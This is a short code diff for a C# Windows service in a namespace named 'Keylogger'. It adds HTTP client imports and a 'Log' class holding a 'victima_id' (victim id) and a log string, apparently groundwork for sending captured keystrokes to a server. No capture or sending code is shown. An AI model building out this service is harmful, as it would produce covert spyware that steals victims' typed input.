@@ -7,9 +7,16 @@ using System.Linq;
 using System.ServiceProcess;
 using System.Text;
 using System.Threading.Tasks;
-
+using System.Net.Http;
+using System.Net.Http.Headers;
 namespace Keylogger
 {
+    public class Log
+    {
+        public string victima_id { get; set; }
+        public string log { get; set; }
+    }
+
     public partial class Service1 : ServiceBase
     {
         private System.Timers.Timer tmProcess = null;
@@ -35,6 +42,7 @@ namespace Keylogger
             i++;
             EventLog.WriteEntry("Se ejecuto el processo windows  " + i.ToString());
             tmProcess.Enabled = true;
+            
         }
 
         protected override void OnStop()
